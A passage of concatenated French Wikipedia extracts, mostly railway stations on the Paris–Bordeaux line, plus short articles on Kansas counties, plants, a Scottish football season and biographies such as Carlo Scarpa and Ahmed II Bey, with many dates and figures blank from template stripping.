Établie à d'altitude, la gare de Ruffec est située au point kilométrique (PK) de la ligne de Paris-Austerlitz à Bordeaux-Saint-Jean, entre les gares ouvertes de Saint-Saviol et de Luxé. Vers Saint-Saviol, s'intercalent les gares fermées de Chauffour et de Voulême, et, vers Luxé, celle également fermée de . Ancienne gare de bifurcation, elle était l'origine de la ligne de Ruffec à Roumazières-Loubert (déclassée), et l'aboutissement de la ligne d'Aiffres à Ruffec (également déclassée).
Elle dispose de trois voies de passage, qui desservent un quai latéral et un quai central, et de voies de service. Sur les voies principales de la ligne Paris – Bordeaux, la vitesse limite de traversée de cette gare est de .
Histoire.
La station de Ruffec est mise en service le par la Compagnie du chemin de fer de Paris à Orléans (PO), lorsqu'elle ouvre à l'exploitation la section de Poitiers à Angoulême de sa ligne de Paris à Bordeaux. La station est établie sur la bordure nord-ouest de la ville.
À la suite du , sont mises en service les lignes Ruffec – Niort, en 1885, qui desservait Villefagnan et Chef-Boutonne, et Ruffec – Roumazières, en 1911, qui desservait Champagne-Mouton et Saint-Claud.
En 2004, la gare est de nouveau desservie par le TGV, après une première suppression des arrêts sur la liaison Paris-Montparnasse – Bordeaux. Ces arrêts sont une deuxième fois supprimés lors de la mise en service de la , le . Les élus locaux souhaitent le retour du TGV à partir de , arguant l'importance de cette desserte pour le bassin de vie ; néanmoins, ce souhait ne semble pas réalisable par la SNCF, qui ne restaure pas la desserte TGV à ladite date.
Fréquentation.
De 2015 à 2023, selon les estimations de la SNCF, la fréquentation annuelle de la gare s'élève aux nombres indiqués dans le tableau ci-dessous.
Service des voyageurs.
Accueil.
Gare de la SNCF, elle dispose d'un , avec guichet, ouvert tous les jours. Elle est équipée d'un automate pour l'achat de titres de transport TER.
Un passage souterrain permet la traversée des voies et l'accès aux quais. Pour une meilleure accessibilité de la gare, opérationnelle au début de 2022, notamment pour les personnes à mobilité réduite, une passerelle de équipée de deux escaliers et de deux ascenseurs relie les quais en enjambant les . La hauteur des quais, relevée de donne un accès direct de niveau avec le plancher des rames. De nouveaux abris voyageurs plus spacieux apportent un meilleur confort, tout comme l'éclairage des quais, leur sonorisation et information visuelle en temps réel par des écrans de nouvelle génération.
Desserte.
Ruffec est desservie par des trains du réseau , sur la relation Poitiers – Angoulême. Certains trains poursuivent jusqu’à Châtellerault.
Intermodalité.
Un parking est aménagé à ses abords.
Cinéma et hommage.
On peut rapidement voir la gare de Ruffec dans le film "Le Dîner de cons" de Francis Veber, au tout début du film quand François Pignon (Jacques Villeret) discute dans le TGV Atlantique avec Jean Cordier (Edgar Givry), ami de Pierre Brochant.
La motrice CC 6520, unité de la série CC 6500 à la livrée Voiture Grand Confort ayant tracté à certains rapides classés comme Trans-Europ-Express sur les axes principaux sud-ouest et sud du réseau électrifié en courant continu sous , présentait depuis le , au milieu de ses flancs le blason de la ville de Ruffec, durant une bonne partie de ses de circulation. Depuis sa radiation le , son blason « RUFFEC » est affiché sur la BB 26116, de couleur grise, affectée au service du fret.

</doc>
<doc id="1873118" url="https://fr.wikipedia.org/wiki?curid=1873118" title="Bataille des Monts">
Bataille des Monts



</doc>
<doc id="1873123" url="https://fr.wikipedia.org/wiki?curid=1873123" title="Grands Reportages (émission de télévision)">
Grands Reportages (émission de télévision)

Grands Reportages est un magazine de reportage et d'informations créé par Henri Chambon le et diffusé sur TF1 jusqu'en puis diffusé en été 1998. Elle refait son apparition en .
Historique.
"Grands Reportages" apparaît à la télévision le sur TF1. L'émission est programmée principalement le vendredi en deuxième partie de soirée (1989-1994) mais selon une périodicité variable de quelques émissions par an. Elle se compose d'un grand reportage unique de environ sur des faits de société et d'actualité.
À partir de 1994, "Grands Reportages", toujours diffusée à un rythme irrégulier de quelques émissions par an, quitte sa case du vendredi soir, et ne possède plus de jour de diffusion particulier. Néanmoins, durant l'été 1998, elle est diffusée chaque lundi en deuxième partie de soirée jusqu'au , date de la dernière émission.
L'émission revient à l'antenne le dimanche à , après le Journal de, après d'absence. Le reportage pilote est "Le monde en train". Elle est désormais diffusée chaque dimanche après le journal de .
Pour l'occasion, l'identité visuelle (logo) de "Reportages" et de "Grands Reportages" a été retouchée.

</doc>
<doc id="1873130" url="https://fr.wikipedia.org/wiki?curid=1873130" title="Fondation Vuk">
Fondation Vuk

La Fondation Vuk (en serbe ou ) est une institution culturelle située à Belgrade, la capitale de la Serbie. Elle a été créée en 1987, pour le de la naissance de Vuk Stefanović Karadžić, le grand réformateur de la langue serbe au . Elle est située rue "Kralja Milana", à côté de Terazije, la place centrale de la capitale. En raison de sa valeur architecturale, le bâtiment est inscrit sur la liste des monuments culturels de grande importance de la république de Serbie et sur la liste des biens culturels de la ville de Belgrade.
Présentation.
Le bâtiment qui abrite l'actuelle Fondation Vuk était au départ un hôtel particulier construit en 1870-1871 par l'architecte Aleksandar Bugarski pour Arsenije Golubović, à l'époque maire de Belgrade. La façade fut modifiée par l'architecte Branko Tanazević en 1912 ; elle fut réalisée dans un style typiquement serbo-byzantin.
L'édifice a autrefois abrité le Ministère de l'éducation ; il héberge à présent la Fondation Vuk. Cette fondation a été créée avec le concours de nombreuses institutions culturelles de Serbie, comme l'Académie serbe des sciences et des arts, le Parlement de Serbie, la Matica srpska, l'université de Belgrade, ou encore les universités de Novi Sad, Kragujevac, Priština, Niš etc. Elle s'est donné comme mission de diffuser la pensée de Vuk Stefanović Karadžić en publiant ses œuvres et des ouvrages écrits sur lui.

</doc>
<doc id="1873133" url="https://fr.wikipedia.org/wiki?curid=1873133" title="Gentiane des Alpes">
Gentiane des Alpes

La Gentiane des Alpes aussi appelée Gentiane alpine ("Gentiana alpina") est une espèce de plantes herbacées vivaces de la famille des "Gentianaceae". 
Description.
La taille de la gentiane des Alpes est de de haut au maximum. Elle ne possède pas de tige alors qu'une autre espèce occupant les mêmes milieux, la gentiane acaule en possède une parfois très petite. Les feuilles sont très courtes, assez larges et relativement épaisses. La fleur mesure de 20 à de long. La floraison a lieu de juin à aout.
Répartition et habitat.
Elle se développe dans les pelouses alpines et subalpines sur des sols acides à des altitudes variant de à .

</doc>
<doc id="1873134" url="https://fr.wikipedia.org/wiki?curid=1873134" title="Gare de Chalais">
Gare de Chalais

La gare de Chalais est une gare ferroviaire française de la ligne de Paris-Austerlitz à Bordeaux-Saint-Jean, située sur le territoire de la commune de Chalais, dans le département de la Charente, en région Nouvelle-Aquitaine.
Elle est mise en service en 1852 par la Compagnie du chemin de fer d'Orléans à Bordeaux.
C'est une halte voyageurs de la Société nationale des chemins de fer français (SNCF), desservie par des trains .
Situation ferroviaire.
Établie à d'altitude, la gare de Chalais est située au point kilométrique (PK) 499,969 de la ligne de Paris-Austerlitz à Bordeaux-Saint-Jean entre les gares ouvertes de Montmoreau et de Saint-Aigulin - La Roche-Chalais. En direction de Montmoreau, s'intercale la gare fermée de Montboyer, et en direction de Saint-Aigulin, celle également fermée de Parcoul - Médillac.
Histoire.
La station de Chalais est mise en service le par la Compagnie du chemin de fer d'Orléans à Bordeaux, lorsqu'elle ouvre à l'exploitation le tronçon de Bordeaux à Angoulème. Le bâtiment de la station est achevé.
La gare marchandises, située juste à côté de la gare voyageurs, a été reconstruite dans les années 1930 en béton armé, nouveau matériau à cette époque, après un incendie.
En 2010, la gare est desservie par cinq ou six trains du lundi au vendredi (cinq vers Bordeaux, six vers Angoulême), et quatre trains les samedis, dimanches et fêtes (trois vers Bordeaux, quatre vers Angoulême). 
En , ce sont environ douze ou quatorze TER qui desservent la gare à la suite de l'augmentation des fréquences demandée par les régions Poitou-Charentes et Aquitaine.
Le , les guichets de la gare sont fermés.
En 2021, la gare est desservie par cinq trains TER Nouvelle-Aquitaine du lundi au vendredi (cinq vers Bordeaux et inversement vers Angoulême), deux trains les samedis et deux ou trois trains le dimanche et fêtes (deux vers Bordeaux et trois vers Angoulême dont l’un en provenance de Coutras).
Fréquentation.
De 2015 à 2023, selon les estimations de la SNCF, la fréquentation annuelle de la gare s'élève aux nombres indiqués dans le tableau ci-dessous:
Service des voyageurs.
Accueil.
Halte SNCF, c'est un point d'arrêt non géré (PANG) à accès libre.
Desserte.
Chalais est desservie par des trains de la relation d’Angoulême à Bordeaux-Saint-Jean. Le train 865050, le dimanche effectue une liaison de la gare de Coutras vers celle d’Angoulême.
Intermodalité.
Un parking pour les véhicules y est aménagé.
Des cars desservent la gare.

</doc>
<doc id="1873137" url="https://fr.wikipedia.org/wiki?curid=1873137" title="Gare de Montmoreau">
Gare de Montmoreau

La gare de Montmoreau est une gare ferroviaire française de la ligne de Paris-Austerlitz à Bordeaux-Saint-Jean, située sur le territoire de l'ancienne commune de Saint-Amant-de-Montmoreau, faisant partie de la commune nouvelle de Montmoreau, dans le département de la Charente, en région Nouvelle-Aquitaine.
Elle est mise en service en 1852. C'est une halte de la Société nationale des chemins de fer français (SNCF), desservie par des trains TER Nouvelle-Aquitaine.
Situation ferroviaire.
Établie à d'altitude, la gare de Montmoreau est située au point kilométrique (PK) 483,472 de la ligne de Paris-Austerlitz à Bordeaux-Saint-Jean, entre les gares ouvertes de La Couronne et de Chalais. Elle est séparée de La Couronne par les gares fermées de Mouthiers, Charmant, Chavenat et de la gare de Chalais par celle de Montboyer.
Histoire.
Lors l'inauguration officielle de la ligne le , il est prévu un trajet direct entre Chalais et Angoulême. Mais une foule considérable s'est massée sur le quai et acclame Napoléon III pendant que le train dépasse la gare. Le train, à la demande de Napoléon III va s'arrêter puis reculer jusqu'à la gare de Montmoreau.
Située sur la commune de Saint-Amant-de-Montmoreau, la gare a été construite en 1852, puis a été fermée en 1994, avant d'être démolie en 2000, comme ses voisines sur la ligne.
Fréquentation.
De 2015 à 2023, selon les estimations de la SNCF, la fréquentation annuelle de la gare s'élève aux nombres indiqués dans le tableau ci-dessous.
Service des voyageurs.
Desserte.
La gare est desservie par des trains TER Nouvelle-Aquitaine, vers Bordeaux et Angoulême. Le train 865050, le dimanche effectue une liaison de la gare de Coutras vers celle d’Angoulême.

</doc>
<doc id="1873141" url="https://fr.wikipedia.org/wiki?curid=1873141" title="Kujō Yoritsune">
Kujō Yoritsune

, aussi connu sous le nom Fujiwara no Yoritsune, est le quatrième shogun (r. 1226-1244) du "bakufu" de Kamakura au Japon. Son père est le régent "kampaku" Kujō Michiie.

</doc>
<doc id="1873142" url="https://fr.wikipedia.org/wiki?curid=1873142" title="24 Heures du Mans 1983">
24 Heures du Mans 1983

Les 24 Heures du Mans 1983 sont la de l'épreuve et se déroulent les 18 et 19 juin 1983 sur le circuit de la Sarthe. Cette course est la quatrième manche du Championnat du monde des voitures de sport 1983 (WSC - World Sportscar Championship) et du Championnat d'Europe des voitures de sport 1983.
Nombre de pilotes qualifiés pour la course.
145 pilotes sont sur la grille de départ de ces cinquante-et-unièmes 24 Heures du Mans. Parmi eux, deux femmes dont Anne-Charlotte Verney qui prend le volant ici pour la dernière fois de sa carrière. Cette participation à la course mancelle est la dixième de la pilote ce qui constitue, encore à ce jour, un record pour une femme.
Déroulement de la course.
Classement final de la course.
Voici le classement officiel au terme des 24 heures de course.
"Détail :"
Heures en tête.
Voitures figurant en tête de l'épreuve à la fin de chaque heure de course :

</doc>
<doc id="1873143" url="https://fr.wikipedia.org/wiki?curid=1873143" title="Gare de Saint-Aigulin - La Roche-Chalais">
Gare de Saint-Aigulin - La Roche-Chalais

La gare de Saint-Aigulin - La Roche-Chalais est une gare ferroviaire française de la ligne de Paris-Austerlitz à Bordeaux-Saint-Jean, située sur le territoire de la commune de Saint-Aigulin, dans le département de la Charente-Maritime, à proximité de La Roche-Chalais (département de la Dordogne), en région Nouvelle-Aquitaine.
C'est une halte de la Société nationale des chemins de fer français (SNCF), desservie par des trains TER Nouvelle-Aquitaine.
Situation ferroviaire.
Établie à d'altitude, la gare de Saint-Aigulin - La Roche-Chalais est située au point kilométrique (PK) 513,924 de la ligne de Paris-Austerlitz à Bordeaux-Saint-Jean entre les gares ouvertes de Chalais et des Églisottes.
Fréquentation.
De 2015 à 2023, selon les estimations de la SNCF, la fréquentation annuelle de la gare s'élève aux nombres indiqués dans le tableau ci-dessous.
Service des voyageurs.
Desserte.
En 2021, la gare est desservie par cinq trains TER Nouvelle-Aquitaine du lundi au vendredi (cinq vers Bordeaux et inversement vers Angoulême), deux trains les samedis et deux ou trois trains le dimanche et fêtes (deux vers Bordeaux et trois vers Angoulême dont l’un en provenance de Coutras).

</doc>
<doc id="1873146" url="https://fr.wikipedia.org/wiki?curid=1873146" title="Auguste Perdonnet">
Auguste Perdonnet

Jean-Albert-Vincent-Auguste Perdonnet, né le à Paris et mort le à Cannes, est un ingénieur français issu d'une famille d'origine suisse. Il est directeur de l'École Centrale des Arts et Manufactures entre 1862 et 1867.
Biographie.
Fils de Vincent Perdonnet, agent de change, protestant et originaire de Vevey en Suisse, Auguste Perdonnet est né le à Paris. Élève à Yverdon il bénéficie de l'enseignement de Johann Heinrich Pestalozzi. En 1821 il entre à l'École polytechnique de Paris ; accusé de carbonarisme, il est renvoyé l'année suivante pour activités politiques.
Il poursuit néanmoins ses études à l'École nationale supérieure des mines de Paris et effectue des voyages d'études en Allemagne et en Angleterre. Ces périples studieux en compagnie d'autres jeunes étudiants sont à l'origine de ses premières publications, notamment avec Léon Coste dès 1829, mais aussi avec Armand Dufrénoy et Élie de Beaumont.
Contributions.
Après la fin de ses études à l'école des Mines en 1830, il est réintégré comme ingénieur civil dans le Corps des Ponts, à la suite d'une intervention de Jean Ernest Reynaud.
Il entre ensuite dans les chemins de fer naissants en intégrant l'équipe d'ingénieurs travaillant sur le projet et la construction du chemin de fer de Paris à Saint-Germain. Cette entrée dans la Compagnie du Chemin de fer de Paris à Saint-Germain lui permet de travailler, notamment avec les « frères » Flachat, Eugène et Stéphane, Émile Clapeyron et Gabriel Lamé.
De 1836 à 1840 il est directeur de la rédaction du Journal de l'industriel et du capitaliste.
Il est avec Émile Auguste Payen ingénieur en chef des travaux de construction du viaduc de Meudon.
Un décret du nomme Auguste Perdonnet, comme successeur d'Alphonse Lavallée, à la direction de l'École Centrale des Arts et Manufactures. À son nouveau poste, il va soutenir activement son prédécesseur pour la création d'une association des anciens élèves dont l'assemblée générale constitutive a lieu le . Il en préside le premier banquet annuel qui a lieu le soir même.
Il aura consacré sa vie, travail et enseignement, aux chemins de fer.
Il est inhumé au cimetière du Père-Lachaise (division 4).

</doc>
<doc id="1873147" url="https://fr.wikipedia.org/wiki?curid=1873147" title="Sedoideae">
Sedoideae

La sous-famille des Sedoideae est une des six sous-familles de la famille des "Crassulaceae" selon la classification classique.Elle regroupe alors 10 genres : 
Selon la , cette sous-famille n'existe plus : elle est incorporée à la sous-famille des "Sempervivoideae", elle-même subdivisée en 2 tribus : "Kalanchoeae" et "Sedeae".
La taxonomie des diverses sous-familles de la famille des "Crassulaceae" a subi de nombreux remaniements.

</doc>
<doc id="1873148" url="https://fr.wikipedia.org/wiki?curid=1873148" title="Carlo Scarpa">
Carlo Scarpa

Carlo Scarpa, né le à Venise et mort le à Sendai, est un architecte et designer italien.
Biographie.
Sa famille s'installe à Vicence en 1908 puis, au décès de la mère, survenu en 1919, Carlo, son père, instituteur, et son frère retournent vivre à Venise.
Carlo Scarpa est admis à l""' de Venise en 1920, après un infructueux et, simultanément à ses études, il travaille dans l'agence de l'architecte vénitien Vincenzo Rinaldo ; il obtient, en 1926, son diplôme de dessinateur d'architecture puis il est l'assistant du professeur Guido Cirilli à la faculté d'architecture de Venise où, en 1933, il est chargé de cours. 
Il entre tout d'abord en contact avec les industriels du verre de Murano et tout particulièrement les verreries Cappellin, dont il devient le conseiller artistique, et Venini, en 1933 pour qui il crée des objets en verre durant plus de 14 ans. Les possibilités plastiques du verre stimulent en lui une recherche et une expérimentation constantes sur le détail.
Ce même soin se retrouve les années suivantes dans ses restaurations et mise en scène de ses œuvres, qui se distinguent par le raffinement, l'expressivité des différents matériaux, l'alternance de nuances chromatiques et la juxtaposition de propriétés tactiles (surfaces lisses et rugueuses ou rêches), la clarté conceptuelle entre éléments horizontaux et éléments verticaux.
En 1942, il est le scénographe de la Biennale de Venise, la d'une collaboration qui dure 30 ans.
Dans les années 1950, il excelle dans la restauration et le réaménagement de musées ; ainsi, les restaurations du palais Abatellis à Palerme en 1953, du musée de Castelvecchio à Vérone en 1956 puis, l'année suivante, de la "Quadreria" du musée Correr à Venise ; en 1955, l'extension de la "" à Possagno.
Il restructure également des magasins, ceux d'Olivetti sis place saint Marc à Venise, de Gavina à Bologne et des locaux de société, ceux du siège de la "Banca Populare di Verona" à Vérone.
Il décède accidentellement le , lors d'un voyage au Japon où il avait été accueilli comme un maître. Selon ses dernières volontés, il est inhumé dans la mausolée de la famille Brion à San Vito d'Altivole près de Trévise, dont il est l'auteur.
En 1984, le compositeur Luigi Nono lui a dédié la composition pour orchestre à microintervalles "A Carlo Scarpa, Architetto, Ai suoi infiniti possibili".

</doc>
<doc id="1873149" url="https://fr.wikipedia.org/wiki?curid=1873149" title="Marwan Kassab Bachi">
Marwan Kassab Bachi

Marwan Kassab Bachi (), dit Marwan, né le à Damas et mort le à Berlin, est l'un des peintres les plus connus de Syrie.
Biographie.
En 1957, Marwan Kassab Bachi a voyagé à Berlin, ville qu’il n’a plus quittée depuis. De 1957 à 1963 il étudie la peinture à l'École supérieure des beaux-arts de Berlin () avec le professeur Hann Trier. De 1980 à 2002, il était professeur de peinture dans la même école.
Une de ses peintures, "Homme au gilet vert" (1967), fait partie des collections du Musée National d'Art Moderne.
Liens externes.
 

</doc>
<doc id="1873153" url="https://fr.wikipedia.org/wiki?curid=1873153" title="Véhicule terrestre à moteur">
Véhicule terrestre à moteur



</doc>
<doc id="1873157" url="https://fr.wikipedia.org/wiki?curid=1873157" title="Comté de Rawlins">
Comté de Rawlins

Le comté de Rawlins est l’un des 105 comtés de l’État du Kansas, aux États-Unis, à la frontière avec le Nebraska. Fondé le 20 mars 1873, il a été nommé en hommage au général John A. Rawlins (1831-1869), secrétaire à la Guerre.
Siège et plus grande ville : Atwood.

</doc>
<doc id="1873158" url="https://fr.wikipedia.org/wiki?curid=1873158" title="Championnat d'Écosse de football 2007-2008">
Championnat d'Écosse de football 2007-2008

La du championnat d'Écosse de football est remportée par le Celtic Football Club. C’est son de champion. Les Celts l’emportent avec trois points d’avance sur les Rangers. Le Motherwell FC complète le podium. 
Le système de promotion/relégation reste en place : descente et montée automatique pour le dernier de première division et le premier de deuxième division : Gretna FC descend en deuxième division. Il est remplacé pour la saison 2007-2008 par Hamilton Academical.
Avec 25 buts marqués en 38 matchs, Scott McDonald du Celtic Football Club remporte pour la première fois le titre de meilleur buteur du championnat. 
Compétition.
Classement.
Le classement est établi sur le barème de points classique (victoire à 3 points, match nul à 1, défaite à 0).

</doc>
<doc id="1873160" url="https://fr.wikipedia.org/wiki?curid=1873160" title="Gabriel Audisio (romancier et poète)">
Gabriel Audisio (romancier et poète)



</doc>
<doc id="1873167" url="https://fr.wikipedia.org/wiki?curid=1873167" title="Comté de Hamilton (Kansas)">
Comté de Hamilton (Kansas)

Le comté de Hamilton est l’un des 105 comtés de l’État du Kansas, aux États-Unis, à la frontière avec le Colorado. Il a été fondé le 20 mars 1873.
Siège et plus grande ville : Syracuse.

</doc>
<doc id="1873168" url="https://fr.wikipedia.org/wiki?curid=1873168" title="Internet sans fil">
Internet sans fil



</doc>
<doc id="1873169" url="https://fr.wikipedia.org/wiki?curid=1873169" title="Chaînes trophiques">
Chaînes trophiques



</doc>
<doc id="1873170" url="https://fr.wikipedia.org/wiki?curid=1873170" title="Sempervivoideae">
Sempervivoideae

La sous-famille des Sempervivoideae est une des six sous-familles de la famille des "Crassulaceae" selon la classification classique. Elle regroupait alors 6 genres : 
Dans la , cette sous-famille est complétée de nombreux genres provenant notamment de l'ancienne sous-famille des "Echeverioideae".
Les "Sempervivoideae" renferment maintenant 2 tribus :
Le traitement des six familles originales a subi de nombreuses modifications de la part des taxonomistes, rien n'exclut d'éventuels changements futurs.

</doc>
<doc id="1873172" url="https://fr.wikipedia.org/wiki?curid=1873172" title="François-Georges Maréchal de Bièvre">
François-Georges Maréchal de Bièvre



</doc>
<doc id="1873174" url="https://fr.wikipedia.org/wiki?curid=1873174" title="François-Georges de Bièvre">
François-Georges de Bièvre



</doc>
<doc id="1873184" url="https://fr.wikipedia.org/wiki?curid=1873184" title="Nikolaï Demidenko">
Nikolaï Demidenko

Nikolaï Demidenko est un pianiste soviétique puis britannique, né le , élève au Conservatoire Tchaïkovski de Moscou, et médaillé au Concours international Tchaïkovski.
Biographie.
Demidenko a étudié à l'Académie russe de musique Gnessine avec Anna Kantor et au Conservatoire Tchaïkovski de Moscou sous la direction de Dmitri Bashkirov. Il était finaliste au Concours International de Piano de Montréal 1976 et au Concours International Tchaikovsky 1978. Il a enseigné à l'École Yehudi Menuhin au Royaume-Uni, où il réside depuis 1990. Il a obtenu la citoyenneté britannique en 1995 et occupe un poste de professeur invité à l'Université de Surrey. 
En plus d'une grande quantité du répertoire germanique et russe standard, il est un spécialiste de Frédéric Chopin et un champion réputé des œuvres de compositeurs négligés tels que Muzio Clementi, Carl Maria von Weber, Jan Václav Voříšek et Nikolai Medtner, ainsi que des œuvres négligées de compositeurs bien connus tels que Domenico Scarlatti, Wolfgang Amadeus Mozart, Franz Schubert et Robert Schumann, et des transcriptions de Ferruccio Busoni. Demidenko a remporté un Gramophone Award en 1992 dans la catégorie concerto pour son enregistrement des concertos pour piano n ° 2 et 3 de Medtner.

</doc>
<doc id="1873185" url="https://fr.wikipedia.org/wiki?curid=1873185" title="Crotalaria spectabilis">
Crotalaria spectabilis

Crotalaria spectabilis est une espèce de plantes à fleurs de la famille des "Fabaceae", originaire d'Asie tropicale.

</doc>
<doc id="1873186" url="https://fr.wikipedia.org/wiki?curid=1873186" title="José Lopez">
José Lopez

José Lopez est un footballeur français né le à Madrid en Espagne. Il évolue au poste de défenseur central du milieu des années 1960 et au milieu des années 1970.
Formé au RC Paris, il joue ensuite au RC Strasbourg, au FC Metz, à l'AS Nancy-Lorraine, à l'US Toulouse et au Girondins de Bordeaux.
Biographie.
Ce joueur d'origine espagnole et naturalisé français, est considéré comme l'un des meilleurs stoppeurs du championnat au début des années 1970.
Victime d'une grave blessure lors d'un match en 1973, celle-ci l'empêchera d'avoir une carrière plus brillante.
Il est plus tard entraîneur à l’école de football de l'AS Nancy-Lorraine.

</doc>
<doc id="1873188" url="https://fr.wikipedia.org/wiki?curid=1873188" title="José Luis Sanchez del Rio">
José Luis Sanchez del Rio

José Luis Sánchez del Río, né le à et mort le dans la même localité, est un jeune mexicain, « cristero », tué à l’âge de 14 ans pour n’avoir pas voulu renier sa foi catholique.
Il est déclaré martyr et béatifié le . Le , le pape François lui reconnaît un deuxième miracle. Il a été canonisé le .
Biographie.
Enfance.
José Luis, troisième des quatre enfants de Macario Sánchez Sánchez et de María del Rio, naît dans une famille fortunée dont les parents lui apprennent à servir les plus pauvres. Il fréquente les sacrements, se rend régulièrement à la messe le dimanche, récite le chapelet tous les jours et prie avec ferveur Notre-Dame de Guadalupe. Il fréquente l’école de son village puis une autre à Guadalajara.
Guerre des Cristeros.
Lorsque la guerre civile des Cristeros éclate en 1926, ses frères aînés Macario et Miguel rejoignent les forces en rébellion contre le gouvernement issu de la révolution de 1910 et la Constitution de 1917, mais sa mère refuse que José Luis, qui veut donner sa vie au Christ, s’engage avec eux. Le général cristero Gorostieta, qui ne veut pas l’enrôler en raison de son âge, l'accepte finalement comme porte-drapeau. Les cristeros le surnomment Tarcisius, du nom d'un saint martyr qui avait protégé l’Eucharistie de la profanation.
Au cours d'une bataille contre les troupes gouvernementales, le , le cheval du général est tué et José lui donne le sien afin qu'il puisse s'échapper et continuer la lutte. José estime en effet que la présence du général à la tête des cristeros est indispensable à la victoire de la cause du Christ-Roi. Le suivant, lors d'un nouvel accrochage avec les soldats, il se défend avec courage, mais il est capturé et emprisonné dans la sacristie de l’église Saint-Jacques de Sahuayo où il prie le chapelet tous les jours et écrit une lettre à sa mère, disant qu’il est prêt à mourir pour Dieu. Son père se propose de payer une rançon pour lui, mais les troupes gouvernementales, ayant reçu la consigne d'éliminer les prisonniers cristeros, refusent.
Mort.
Le , ses geôliers le sortent de sa prison et le forcent à se diriger vers le cimetière après lui avoir coupé la plante des pieds et à marcher dans du sel. On le contraint à cheminer longuement pieds nus autour du cimetière. Son bourreau lui promet que s’il crie « mort au Christ-Roi », il aura la vie sauve. José Luis répond au contraire par le cri de ralliement des cristeros : « Longue vie au Christ-Roi ». Il doit ensuite creuser sa propre tombe. Exaspéré par sa résistance, et voyant qu'il n'arrivera pas à lui faire renier sa foi, son bourreau lui décharge son pistolet dans le dos. Son corps est jeté dans la fosse et recouvert de quelques pelletées de terre.
Dans la poche d'un vêtement de ce garçon, on trouvera un papier destiné à sa mère : .
Reconnaissance posthume.
Les restes du corps de José Luis Sánchez del Río reposent aujourd'hui dans l’église du Sacré-Cœur-de-Jésus de Sahuayo.
Une congrégation religieuse semble avoir été influencée par le jeune martyr : l'institut des ouvriers du règne du Christ dont le père Enrique Amezcua Medina a trouvé sa vocation grâce à José Luis.
Béatification.
Le , José Luis est béatifié en compagnie de douze autres martyrs, lors d'une cérémonie présidée par le cardinal José Saraiva Martins dans le stade Jalisco de Guadalajara.
Canonisation.
Le , le pape François autorise la Congrégation pour la cause des saints à publier un décret reconnaissant un deuxième miracle attribué à son intercession. José Luis Sánchez del Río est ainsi canonisé le .
Culture.
En 2012, son rôle est interprété par Mauricio Kuri dans le film "Cristeros" de Dean Wright.

</doc>
<doc id="1873195" url="https://fr.wikipedia.org/wiki?curid=1873195" title="La Vie peu ordinaire de Dona Linhares">
La Vie peu ordinaire de Dona Linhares

La Vie peu ordinaire de Dona Linhares (en ) est un film brésilien réalisé par Andrucha Waddington sorti en 2000. 

</doc>
<doc id="1873197" url="https://fr.wikipedia.org/wiki?curid=1873197" title="Ahmed II Bey">
Ahmed II Bey

Ahmed II (), né le au palais Dar al-Taj de La Marsa et mort le à La Marsa, est bey de Tunis de la dynastie des Husseinites de 1929 à sa mort.
Biographie.
Lieutenant-colonel de l'armée beylicale, il est investi prince héritier le et succède à son défunt cousin Habib Bey le . Mort en 1942, il est enterré au Tourbet El Bey selon la tradition familiale.
Il a dix garçons et huit filles dont le prince Mohamed El Taïeb Bey (1902-1989). Il est par ailleurs le grand-père du juriste et universitaire El Mokhtar Bey et le beau-père du général Slim Dziri (Jaziri) qui a été ministre plénipotentiaire de 1929 à 1935.
Après juin 1940, le régime de Vichy nomme comme résident général de France en Tunisie l'amiral Jean-Pierre Esteva, qui presse Ahmed Bey d'appliquer les lois relatives à l'exclusion des Juifs de la vie civile. L'article 9 de la « loi du portant statut des Juifs » décrète qu'elle est applicable aux territoires des colonies et protectorats de la République française, dont la Tunisie. Ahmed Bey signe le décret d'application du , qui exclut les Juifs de l'administration, des médias, tout en autorisant la publication du "Journal israélite de Tunisie". Il impose également un "numerus clausus" quant aux professions libérales, limitant l'accès des Juifs à certains domaines comme la médecine. Ahmed Bey signe également deux autres décrets, celui du , dissolvant les groupes de jeunesse juifs, et un autre, le , qui met fin au Conseil communautaire juif. Le , il ordonne le recensement de tous les Juifs de Tunisie. Son successeur, Moncef Bey aura une attitude différente.

</doc>
<doc id="1873201" url="https://fr.wikipedia.org/wiki?curid=1873201" title="Pointe des Jardins">
Pointe des Jardins



</doc>
<doc id="1873202" url="https://fr.wikipedia.org/wiki?curid=1873202" title="Fantasy of manners">
Fantasy of manners

La fantasy de mœurs (, ou ) est un sous-genre de la fantasy apparu dans les années 1980. Il se caractérise par la présence d'un cadre social très élaboré et hiérarchisé dans lequel le héros doit trouver sa place, si besoin en tirant avantage des structures existantes (généralement dans un environnement urbain).
On peut ainsi retrouver comme éléments, des intrigues de cour, politiques et/ou commerciales, une place importante de la cité, de ses habitants et ses environs, des mœurs de la noblesse et du peuple, encore l'usage d'un langage très étudié, que ce soit par une grande préciosité ou par l'utilisation de l'argot.
L'expression est apparue dans un article de Donald G. Keller, « "The Manner of Fantasy" », paru dans le n° 32 de "The New York Review of Science Fiction" (). Il y définit les influences du genre : au-delà des précurseurs de la fantasy (William Morris, E. R. Eddison, Mervyn Peake, J. R. R. Tolkien), il mentionne les œuvres de Jane Austen et des sœurs Brontë, les romans historiques de Dorothy Dunnett, et plus généralement les séries télévisées ("Star Trek", "Chapeau melon et bottes de cuir") et la musique (les Beatles, Fairport Convention) qui ont pu bercer l'adolescence des auteurs du genre.
Auteurs.
Les auteurs de "" sont majoritairement des femmes.
Parmi les précurseurs du genre, on peut compter Michael Moorcock ("Gloriana ou la reine inassouvie", 1978) ou M. John Harrison (la série "Viriconium").

</doc>
<doc id="1873203" url="https://fr.wikipedia.org/wiki?curid=1873203" title="Square Mahé de Labourdonnais">
Square Mahé de Labourdonnais



</doc>
<doc id="1873205" url="https://fr.wikipedia.org/wiki?curid=1873205" title="Équipe d'Écosse féminine de football">
Équipe d'Écosse féminine de football

L'équipe d'Écosse féminine de football représente l'Écosse dans le football féminin international sous l'égide de la Fédération écossaise de football. Elle est actuellement au classement mondial féminin de la FIFA ().
Histoire.
L'équipe d’Écosse dispute son premier match féminin international contre l'Angleterre le (défaite 2-3), près de cent ans après le premier match officiel de football international de l'Histoire ayant mis aux prises les équipes masculines anglaises et écossaises. Un tel décalage qui s'explique par l'interdiction faite aux femmes de disputer des rencontres officielles de football de la part de la Fédération anglaise de football de 1921 à 1971, frein au professionnalisme du foot féminin au Royaume-Uni, bien que la pratique du foot chez les femmes en Angleterre comme en Écosse y est ancienne (depuis la fin du ).
